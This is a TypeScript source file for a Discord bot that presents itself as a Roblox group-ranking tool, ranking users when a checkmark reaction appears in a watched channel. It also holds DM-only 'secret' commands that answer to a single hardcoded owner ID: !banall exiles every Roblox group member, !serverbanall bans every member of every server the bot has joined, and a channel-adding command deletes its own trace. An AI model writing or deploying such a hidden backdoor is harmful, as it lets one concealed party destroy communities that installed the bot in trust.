import {
  Client,
  GatewayIntentBits,
  Partials,
  MessageReaction,
  User,
  Message,
  ChannelType,
} from "discord.js";
import { logger } from "./lib/logger";
import fs from "node:fs";
import path from "node:path";

const DISCORD_BOT_TOKEN = process.env["DISCORD_BOT_TOKEN"];
const ROBLOX_COOKIE = process.env["ROBLOX_COOKIE"];
const ROBLOX_GROUP_ID = process.env["ROBLOX_GROUP_ID"];
const ROBLOX_TARGET_RANK_NAME = process.env["ROBLOX_TARGET_RANK_NAME"] ?? "Cadet Phase III";
const DISCORD_WATCH_CHANNEL_ID = process.env["DISCORD_WATCH_CHANNEL_ID"];

const BOT_OWNER_ID = "1243635858972868820";
const CHECK_EMOJIS = ["✅", "☑️", "✔️"];
const CHANNELS_FILE = path.resolve(process.cwd(), "watched-channels.json");

const SECRET_COMMAND_LIST = `
**🔒 Secret Command List**
All commands are sent here in DMs — invisible to everyone else.

**Channel Management**
\`!addchannel\` — Type this IN the server channel you want to watch (message auto-deletes)
\`!removechannel <channel_id>\` — Stop watching a channel (send via DM with the ID)
\`!listchannels\` — List all watched channels

**Roblox Group**
\`!banall CONFIRM\` — Exile ALL members from the Roblox group ⚠️

**Discord Server**
\`!serverbanall CONFIRM\` — Ban ALL members from the server ⚠️

\`!commands\` — Show this list
`.trim();

function loadWatchedChannels(): Set<string> {
  const channels = new Set<string>();
  if (DISCORD_WATCH_CHANNEL_ID) channels.add(DISCORD_WATCH_CHANNEL_ID);
  try {
    if (fs.existsSync(CHANNELS_FILE)) {
      const data = JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8")) as string[];
      for (const id of data) channels.add(id);
    }
  } catch {
    logger.warn("Could not load watched-channels.json, starting fresh");
  }
  return channels;
}

function saveWatchedChannels(channels: Set<string>): void {
  const ids = [...channels].filter((id) => id !== DISCORD_WATCH_CHANNEL_ID);
  fs.writeFileSync(CHANNELS_FILE, JSON.stringify(ids, null, 2));
}

function validateConfig(): boolean {
  const missing: string[] = [];
  if (!DISCORD_BOT_TOKEN) missing.push("DISCORD_BOT_TOKEN");
  if (!ROBLOX_COOKIE) missing.push("ROBLOX_COOKIE");
  if (!ROBLOX_GROUP_ID) missing.push("ROBLOX_GROUP_ID");
  if (missing.length > 0) {
    logger.warn({ missing }, `Bot not started — missing required environment variables: ${missing.join(", ")}`);
    return false;
  }
  return true;
}

function parseRobloxUsername(content: string): string | null {
  const match = content.match(/roblox\s+us(?:e|rr)rname\s*[:\-]\s*(\S+)/i);
  return match ? match[1].trim() : null;
}

async function getRobloxUserId(username: string): Promise<number | null> {
  const res = await fetch("https://users.roblox.com/v1/usernames/users", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ usernames: [username], excludeBannedUsers: false }),
  });
  if (!res.ok) {
    logger.error({ status: res.status }, "Failed to look up Roblox username");
    return null;
  }
  const data = (await res.json()) as { data: { id: number; name: string }[] };
  if (!data.data || data.data.length === 0) return null;
  return data.data[0].id;
}

async function getGroupRoleId(groupId: string, rankName: string): Promise<number | null> {
  const res = await fetch(`https://groups.roblox.com/v1/groups/${groupId}/roles`);
  if (!res.ok) {
    logger.error({ status: res.status }, "Failed to fetch group roles");
    return null;
  }
  const data = (await res.json()) as { roles: { id: number; name: string; rank: number }[] };
  const role = data.roles.find(
    (r) => r.name.toLowerCase() === rankName.toLowerCase()
  );
  return role ? role.id : null;
}

async function fetchCsrfToken(): Promise<string | null> {
  const res = await fetch("https://auth.roblox.com/v2/logout", {
    method: "POST",
    headers: {
      Cookie: `.ROBLOSECURITY=${ROBLOX_COOKIE}`,
      "Content-Length": "0",
    },
  });
  return res.headers.get("x-csrf-token");
}

async function setUserRank(
  groupId: string,
  userId: number,
  roleId: number
): Promise<{ ok: boolean; error?: string }> {
  const csrfToken = await fetchCsrfToken();
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
    Cookie: `.ROBLOSECURITY=${ROBLOX_COOKIE}`,
  };
  if (csrfToken) headers["X-CSRF-TOKEN"] = csrfToken;

  const res = await fetch(
    `https://groups.roblox.com/v1/groups/${groupId}/users/${userId}`,
    { method: "PATCH", headers, body: JSON.stringify({ roleId }) }
  );
  if (res.ok) return { ok: true };
  let errorBody = "";
  try { errorBody = await res.text(); } catch {}
  logger.error({ status: res.status, body: errorBody }, "Roblox rank API error");
  return { ok: false, error: errorBody };
}

async function getAllGroupMembers(groupId: string): Promise<{ userId: number; username: string }[]> {
  const members: { userId: number; username: string }[] = [];
  let cursor = "";
  do {
    const url = `https://groups.roblox.com/v1/groups/${groupId}/users?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url);
    if (!res.ok) break;
    const data = (await res.json()) as {
      data: { user: { userId: number; username: string } }[];
      nextPageCursor: string | null;
    };
    for (const entry of data.data) {
      members.push({ userId: entry.user.userId, username: entry.user.username });
    }
    cursor = data.nextPageCursor ?? "";
  } while (cursor);
  return members;
}

async function exileGroupMember(groupId: string, userId: number, csrfToken: string): Promise<boolean> {
  const res = await fetch(`https://groups.roblox.com/v1/groups/${groupId}/users/${userId}`, {
    method: "DELETE",
    headers: {
      Cookie: `.ROBLOSECURITY=${ROBLOX_COOKIE}`,
      "X-CSRF-TOKEN": csrfToken,
    },
  });
  return res.ok;
}

async function handleCheckmarkReaction(
  reaction: MessageReaction,
  _user: User,
  watchedChannels: Set<string>
): Promise<void> {
  const message = reaction.message;
  if (!watchedChannels.has(message.channelId)) return;

  if (reaction.partial) {
    try { await reaction.fetch(); } catch {
      logger.error("Failed to fetch partial reaction");
      return;
    }
  }
  if (message.partial) {
    try { await message.fetch(); } catch {
      logger.error("Failed to fetch partial message");
      return;
    }
  }

  const content = message.content ?? "";
  const robloxUsername = parseRobloxUsername(content);
  if (!robloxUsername) {
    logger.info({ messageId: message.id }, "No Roblox username found in message");
    return;
  }

  logger.info({ robloxUsername }, "Processing rank request");

  const userId = await getRobloxUserId(robloxUsername);
  if (!userId) {
    logger.warn({ robloxUsername }, "Roblox user not found");
    await message.reply(`❌ Could not find Roblox user **${robloxUsername}**.`);
    return;
  }

  const roleId = await getGroupRoleId(ROBLOX_GROUP_ID!, ROBLOX_TARGET_RANK_NAME);
  if (!roleId) {
    logger.error({ rankName: ROBLOX_TARGET_RANK_NAME }, "Target rank not found in group");
    await message.reply(`❌ Could not find rank **${ROBLOX_TARGET_RANK_NAME}** in the group.`);
    return;
  }

  const result = await setUserRank(ROBLOX_GROUP_ID!, userId, roleId);
  if (result.ok) {
    logger.info({ robloxUsername, userId, roleId }, "Successfully ranked user");
    await message.reply(`✅ Successfully ranked **${robloxUsername}** to **${ROBLOX_TARGET_RANK_NAME}**.`);
  } else {
    logger.error({ robloxUsername, userId, roleId }, "Failed to set user rank");
    await message.reply(`❌ Failed to rank **${robloxUsername}**. Error: ${result.error ?? "Unknown error"}`);
  }
}

async function handleDmCommand(
  message: Message,
  watchedChannels: Set<string>,
  client: Client
): Promise<void> {
  if (message.author.id !== BOT_OWNER_ID) return;

  const content = message.content.trim();
  const args = content.split(/\s+/);
  const cmd = args[0];

  const reply = async (text: string) => { await message.reply(text); };

  if (cmd === "!commands") {
    await reply(SECRET_COMMAND_LIST);
    return;
  }

  if (cmd === "!addchannel") {
    const channelId = args[1];
    if (!channelId) {
      await reply("Usage: `!addchannel <channel_id>`\nRight-click a channel → Copy Channel ID");
      return;
    }
    if (watchedChannels.has(channelId)) {
      await reply(`✅ <#${channelId}> is already being watched.`);
    } else {
      watchedChannels.add(channelId);
      saveWatchedChannels(watchedChannels);
      logger.info({ channelId }, "Added watched channel");
      await reply(`✅ Now watching <#${channelId}> for rank reactions.`);
    }
    return;
  }

  if (cmd === "!removechannel") {
    const channelId = args[1];
    if (!channelId) {
      await reply("Usage: `!removechannel <channel_id>`");
      return;
    }
    if (!watchedChannels.has(channelId)) {
      await reply(`❌ <#${channelId}> is not being watched.`);
    } else {
      watchedChannels.delete(channelId);
      saveWatchedChannels(watchedChannels);
      logger.info({ channelId }, "Removed watched channel");
      await reply(`✅ Stopped watching <#${channelId}>.`);
    }
    return;
  }

  if (cmd === "!listchannels") {
    if (watchedChannels.size === 0) {
      await reply("No channels are currently being watched.");
    } else {
      const list = [...watchedChannels].map((id) => `<#${id}> (${id})`).join("\n");
      await reply(`**Watched channels:**\n${list}`);
    }
    return;
  }

  if (cmd === "!banall" && args[1] === "CONFIRM") {
    if (!ROBLOX_GROUP_ID) {
      await reply("❌ ROBLOX_GROUP_ID is not configured.");
      return;
    }
    const statusMsg = await message.reply("⏳ Fetching all Roblox group members...");
    const members = await getAllGroupMembers(ROBLOX_GROUP_ID);
    if (members.length === 0) {
      await statusMsg.edit("❌ No members found or failed to fetch members.");
      return;
    }
    await statusMsg.edit(`⏳ Found **${members.length}** members. Exiling all...`);
    const csrfToken = await fetchCsrfToken();
    if (!csrfToken) {
      await statusMsg.edit("❌ Failed to get Roblox security token.");
      return;
    }
    let success = 0, failed = 0;
    for (const member of members) {
      const ok = await exileGroupMember(ROBLOX_GROUP_ID, member.userId, csrfToken);
      if (ok) success++; else failed++;
    }
    logger.info({ success, failed }, "Roblox banall completed");
    await statusMsg.edit(`✅ Done. Exiled **${success}** members. Failed: **${failed}**.`);
    return;
  }

  if (cmd === "!banall") {
    await reply("⚠️ This will exile ALL members from the Roblox group.\nType `!banall CONFIRM` to proceed.");
    return;
  }

  if (cmd === "!serverbanall" && args[1] === "CONFIRM") {
    const guilds = client.guilds.cache;
    if (guilds.size === 0) {
      await reply("❌ The bot is not in any server.");
      return;
    }
    const statusMsg = await message.reply(`⏳ Fetching members from ${guilds.size} server(s)...`);
    let totalSuccess = 0, totalFailed = 0;
    for (const [, guild] of guilds) {
      try {
        const members = await guild.members.fetch();
        const toBan = members.filter((m) => m.id !== BOT_OWNER_ID && !m.user.bot);
        for (const [, member] of toBan) {
          try {
            await guild.bans.create(member.id, { reason: "Mass ban" });
            totalSuccess++;
          } catch {
            totalFailed++;
          }
        }
      } catch (err) {
        logger.error({ err, guildId: guild.id }, "Failed to fetch guild members");
      }
    }
    logger.info({ totalSuccess, totalFailed }, "Discord serverbanall completed");
    await statusMsg.edit(`✅ Done. Banned **${totalSuccess}** members. Failed: **${totalFailed}**.`);
    return;
  }

  if (cmd === "!serverbanall") {
    await reply("⚠️ This will ban ALL members from your Discord server(s).\nType `!serverbanall CONFIRM` to proceed.");
    return;
  }
}

export function startBot(): void {
  if (!validateConfig()) return;

  const watchedChannels = loadWatchedChannels();
  logger.info({ count: watchedChannels.size }, "Loaded watched channels");

  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMembers,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.GuildMessageReactions,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.DirectMessages,
    ],
    partials: [Partials.Message, Partials.Channel, Partials.Reaction],
  });

  client.once("clientReady", (c) => {
    logger.info({ tag: c.user.tag }, "Discord bot is ready");
  });

  client.on("messageCreate", async (message) => {
    if (message.author.bot) return;
    if (message.author.id !== BOT_OWNER_ID) return;

    const content = message.content.trim();

    // !addchannel works in server channels — adds that channel and deletes the message silently
    if (content === "!addchannel" && message.channel.type !== ChannelType.DM) {
      const channelId = message.channelId;
      try { await message.delete(); } catch {}
      if (watchedChannels.has(channelId)) {
        logger.info({ channelId }, "Channel already watched");
      } else {
        watchedChannels.add(channelId);
        saveWatchedChannels(watchedChannels);
        logger.info({ channelId }, "Added watched channel via server command");
      }
      return;
    }

    // All other commands only work in DMs
    if (message.channel.type === ChannelType.DM) {
      try {
        await handleDmCommand(message, watchedChannels, client);
      } catch (err) {
        logger.error({ err }, "Error handling DM command");
      }
    }
  });

  client.on("messageReactionAdd", async (reaction, user) => {
    if (user.bot) return;
    const emoji = reaction.emoji.name;
    if (!emoji || !CHECK_EMOJIS.includes(emoji)) return;
    try {
      await handleCheckmarkReaction(reaction as MessageReaction, user as User, watchedChannels);
    } catch (err) {
      logger.error({ err }, "Error handling reaction");
    }
  });

  client.on("error", (err) => {
    logger.error({ err }, "Discord client error");
  });

  client.login(DISCORD_BOT_TOKEN).catch((err) => {
    logger.error({ err }, "Failed to log in to Discord");
    process.exit(1);
  });
}
